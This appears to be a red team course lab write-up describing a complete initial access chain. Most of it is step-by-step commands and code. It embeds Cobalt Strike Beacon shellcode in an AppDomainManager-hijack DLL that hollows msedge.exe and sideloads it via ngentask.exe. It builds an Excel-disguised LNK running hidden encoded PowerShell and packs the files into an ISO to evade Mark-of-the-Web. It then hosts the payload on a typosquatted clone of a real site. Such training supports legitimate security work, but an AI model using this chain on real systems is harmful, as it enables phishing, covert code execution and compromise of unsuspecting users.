# CRTO — Initial Access Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Initial Access
**Objective:** Create an initial access infection chain that spawns and injects Beacon shellcode into Microsoft Edge via DLL sideloading with ngentask.exe

---

## The Full Chain

```
Raw Beacon shellcode (http_x64.xprocess.bin)
    ↓
Embedded into AppDomainHijack.dll (process hollowing via AppDomainManager)
    ↓
ngentask.exe sideloads AppDomainHijack.dll (DLL sideloading)
    ↓
AppDomain hijack triggers → spawns msedge.exe suspended → hollows it → injects shellcode
    ↓
Beacon running in msedge.exe
    ↓
Packaged into ISO (PackMyPayload) → hidden files + visible LNK trigger
    ↓
Hosted on CS web server → victim clicks → ISO mounts → decoy xlsx opens + Beacon fires
```

---

## Step 1 — Generate Raw Beacon Shellcode

```
Payloads > Windows Stageless Payload
Listener: http
Output:   Raw
Save to:  C:\Payloads\http_x64.xprocess.bin
```

> **Raw vs EXE:** Raw output is pure shellcode with no PE wrapper — required for process injection. The `.xprocess.bin` naming convention in CRTO indicates cross-process injection shellcode.

---

## Step 2 — AppDomainHijack DLL (Process Hollowing Loader)

**TTP:** T1055.012 — Process Injection: Process Hollowing
**TTP:** T1574.002 — Hijack Execution Flow: DLL Side-Loading

### What AppDomainManager Hijacking Is

.NET applications load an `AppDomainManager` if environment variables tell them to. By setting:
```
APPDOMAIN_MANAGER_TYPE = AppDomainHijack.DomainManager
APPDOMAIN_MANAGER_ASM  = AppDomainHijack, Version=1.0.0.0, ...
```
...any .NET executable will load our DLL and call `InitializeNewDomain()` before doing anything else. No code modification of the target binary needed.

`ngentask.exe` is a legitimate .NET Framework binary — it loads our DLL automatically when these env vars are set.

### What the DLL Does (Process Hollowing)

The `InitializeNewDomain()` method performs classic process hollowing against `msedge.exe`:

```
1. CreateProcessA(msedge.exe, CREATE_SUSPENDED | CREATE_NO_WINDOW)
       ↓ spawns Edge hidden and suspended
2. NtQueryInformationProcess → get PEB base address
       ↓ read PEB to find image base
3. ReadProcessMemory(PebBaseAddress + 0x10)
       ↓ read image base address from PEB
4. ReadProcessMemory(baseAddress, 512 bytes)
       ↓ read PE headers to find entry point
5. Parse e_lfanew (0x3C) → RVA offset (e_lfanew + 0x28) → calculate entry point VA
       ↓ locate where to write shellcode
6. WriteProcessMemory(lpEntryPoint, shellcode)
       ↓ overwrite entry point with Beacon shellcode
7. ResumeThread(pi.hThread)
       ↓ Edge resumes → executes Beacon shellcode → checks in
```

### PE Header Parsing (Key Offsets)

| Offset | Field | Purpose |
|---|---|---|
| `0x3C` | `e_lfanew` | Pointer to PE header (NT Headers) |
| `e_lfanew + 0x28` | `AddressOfEntryPoint` RVA | Relative virtual address of entry point |
| `ImageBase + RVA` | Entry point VA | Absolute address to write shellcode to |

### Visual Studio Project Setup

```
Project type: Class Library (.NET Framework)  ← must be Framework, not .NET 5/6/8
Project name: AppDomainHijack
```

**Embed shellcode as a resource:**
```
Solution Explorer → Add > Existing Item → http_x64.xprocess.bin
Properties → Build Action: Embedded Resource
```

**Read embedded shellcode in code:**
```csharp
var assembly = Assembly.GetExecutingAssembly();
using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
{
    using (var ms = new MemoryStream())
    {
        rs.CopyTo(ms);
        shellcode = ms.ToArray();
    }
}
```

**Build:** Release mode → output at:
```
C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll
```

> If output path contains `net8.0` or similar — wrong project type selected. Must be `.NET Framework`.

**Copy DLL to payload directory:**
```powershell
cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
```

---

## Step 3 — NGenTask (DLL Sideloading Vector)

**TTP:** T1574.002 — Hijack Execution Flow: DLL Side-Loading

`ngentask.exe` is a legitimate signed Microsoft .NET Framework binary. It loads AppDomain managers from environment variables — making it a clean sideloading vector with no modification to the binary itself.

Copy the SxS (Side-by-Side) version — this is important, the SxS version has the correct .NET Framework context:

```powershell
cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
```

### Sanity Test

```powershell
cd C:\Payloads\deals
$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
$env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
.\ngentask.exe
```

> Expected result: New Beacon appears running in `msedge.exe`

---

## Step 4 — Decoy File

A legitimate-looking Excel spreadsheet to open alongside the payload — gives the victim something real to interact with and reduces suspicion.

```
File: C:\Payloads\deals\deals.xlsx
Content: Fake deals/discount data
```

**OPSEC note:** The decoy opens in the same `cmd.exe` chain as the payload via the LNK trigger — victim sees Excel open normally while Beacon fires in the background.

---

## Step 5 — LNK Trigger

**TTP:** T1547.009 — Boot or Logon Autostart: Shortcut Modification
**TTP:** T1204.002 — User Execution: Malicious File

The LNK masquerades as `deals.xlsx` using the Excel icon. When double-clicked it:
1. Opens the real `deals.xlsx` (decoy)
2. Silently runs the base64-encoded PowerShell payload in a hidden window

### Generate the Base64 Payload

```powershell
cd C:\Payloads\deals\
$cmd = '$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
```

### Create the LNK

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath   = "%COMSPEC%"
$lnk.Arguments    = "/C start deals.xlsx && %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

**LNK anatomy:**

| Field | Value | Purpose |
|---|---|---|
| `TargetPath` | `%COMSPEC%` (cmd.exe) | Runs cmd as the launcher |
| `Arguments` | `start deals.xlsx && powershell -enc ...` | Opens decoy + fires payload |
| `IconLocation` | Excel icon | Visual deception — looks like an xlsx |

---

## Step 6 — Package into ISO (PackMyPayload)

**TTP:** T1553.005 — Subvert Trust Controls: Mark-of-the-Web Bypass

ISO containers bypass Mark-of-the-Web (MOTW) — files inside a mounted ISO don't inherit the `Zone.Identifier` ADS that would trigger SmartScreen warnings on downloaded files.

```bash
# From Ubuntu WSL
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py \
  -H deals.xlsx,ngentask.exe,AppDomainHijack.dll \
  /mnt/c/Payloads/deals/ \
  /mnt/c/Payloads/deals/deals.iso
```

**`-H` flag:** Hidden files — `deals.xlsx`, `ngentask.exe`, and `AppDomainHijack.dll` are hidden inside the ISO. Only `deals.xlsx.lnk` is visible when the victim mounts it.

---

## Step 7 — Delivery

**TTP:** T1189 — Drive-by Compromise
**TTP:** T1566 — Phishing (ISO delivery)

### Host the ISO on CS Web Server

```
Site Management > Host File
File:       C:\Payloads\deals\deals.iso
Local URI:  /deals.iso
Local Host: www.bleepincomputer.com
```

### Clone a Legitimate Page (Pretexting)

```
Site Management > Clone Site
Clone URL:  https://deals.bleepingcomputer.com
Local URI:  /deals
Local Host: www.bleepincomputer.com
Attack:     Select hosted deals.iso
```

> Cloning a real site gives the victim a legitimate-looking page. The ISO download is triggered automatically when they visit it.

### Victim Flow

```
Victim browses to http://www.bleepincomputer.com/deals
    ↓ ISO downloads automatically
Click "Open file" → ISO mounts
    ↓ only deals.xlsx.lnk visible (decoy files hidden)
Double-click deals.xlsx.lnk
    ↓ Excel opens deals.xlsx (victim sees nothing suspicious)
    ↓ PowerShell fires hidden → sets env vars → ngentask.exe loads DLL
    ↓ Process hollowing → msedge.exe spawned suspended → shellcode injected
    ↓ Beacon checks in as pchilds running in msedge.exe
```

---

## Key Takeaways

- **AppDomainManager hijacking** is a clean code execution primitive — no shellcode dropped directly, execution flows through a legitimate .NET mechanism
- **Process hollowing into msedge.exe** gives Beacon a highly legitimate cover process — Edge is expected to make network connections
- **ISO containers bypass MOTW** — no SmartScreen prompt, no Zone.Identifier ADS on contained files
- **LNK files** are a reliable delivery mechanism — icon spoofing makes them indistinguishable from real documents to an average user
- **Decoy document** is not optional on real engagements — a victim who clicks something and nothing happens will report it; one who sees a spreadsheet open will move on
- **Hidden files in ISO** (-H flag) mean the victim never sees `ngentask.exe` or the DLL — only the trigger LNK is visible
- The SxS version of `ngentask.exe` is required — the standard system32 version may not load the AppDomainManager correctly
